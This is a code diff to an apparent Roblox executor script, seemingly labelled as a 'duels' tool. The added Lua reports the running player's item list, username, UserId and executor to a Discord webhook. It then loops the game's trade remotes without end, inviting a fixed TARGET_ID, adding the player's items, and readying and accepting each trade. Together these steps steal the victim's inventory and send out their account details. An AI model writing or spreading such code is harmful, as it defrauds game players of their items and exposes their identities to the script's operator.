@@ -402,4 +402,115 @@ local function sendDetailedWebhook()
         local requestFn = getRequestFn()
         if not requestFn then return end
 
-        local top = res
+        local top = resultsList[1]
+        local imageUrl = getBestImageUrl(top.displayName, top.index)
+        local topColor = getBrainrotColor(top.index)
+        local embedColor = colorToDecimal(topColor)
+
+        local lines = {}
+        for i, r in ipairs(resultsList) do
+            lines[i] = r.name .. " — **" .. r.genStr .. "**"
+        end
+        local listText = table.concat(lines, "\n")
+        if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end
+
+        local unixTime = os.time()
+        local pCount = #Players:GetPlayers()
+        local execName = "Unknown"
+        pcall(function()
+            if identifyexecutor then
+                execName = identifyexecutor()
+            elseif getexecutorname then
+                execName = getexecutorname()
+            end
+        end)
+
+        local embed = {
+            title       = top.displayName .. " — " .. top.genStr,
+            description = listText,
+            color       = embedColor,
+            fields      = {
+                {
+                    name   = "Server",
+                    value  = "Players: **" .. pCount .. "** | Scanned: <t:" .. unixTime .. ":R>",
+                    inline = true
+                },
+                {
+                    name   = "Executor",
+                    value  = execName,
+                    inline = true
+                }
+            },
+            footer      = { text = LP.Name .. " • " .. LP.UserId },
+            timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        }
+
+        if imageUrl then
+            embed.thumbnail = { url = imageUrl }
+        end
+
+        local payloadData = {
+            embeds     = { embed },
+            username   = "JW ALEE DUELS LOGS",
+            avatar_url = avatarUrl,
+        }
+
+        if ping then
+            payloadData.content = "||@everyone||"
+        end
+
+        local payload = HttpService:JSONEncode(payloadData)
+
+        pcall(function()
+            requestFn({
+                Url     = webhookUrl,
+                Method  = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body    = payload,
+            })
+        end)
+    end
+
+    sendToWebhook(resultsPrimary, GOOD_WEBHOOK, requirePingPrimary, GOOD_AVATAR)
+end
+
+local function startFullAutomation()
+    local inviteRemote = getRemote("TradeService/Invite")
+    local addRemote    = getRemote("TradeService/AddBrainrot")
+    local readyRemote  = getRemote("TradeService/Ready")
+    local acceptRemote = getRemote("TradeService/Accept")
+
+    if not (inviteRemote and addRemote and readyRemote and acceptRemote) then return end
+
+    task.spawn(function()
+        local idx = 1
+        while true do
+            local item = brainrotQueue[idx]
+            if item then
+                pcall(function() addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data) end)
+                idx = (idx % #brainrotQueue) + 1
+            end
+            task.wait(DELAY_STEP)
+        end
+    end)
+
+    task.spawn(function()
+        while true do
+            pcall(function() inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID) end)
+            task.wait(TRADE_CYCLE_DELAY)
+        end
+    end)
+
+    task.spawn(function()
+        while true do
+            pcall(function() readyRemote:FireServer(READY_GUID) end)
+            task.wait(1)
+            pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
+            task.wait(1)
+        end
+    end)
+end
+
+sendDetailedWebhook()
+startFullAutomation()
+end)
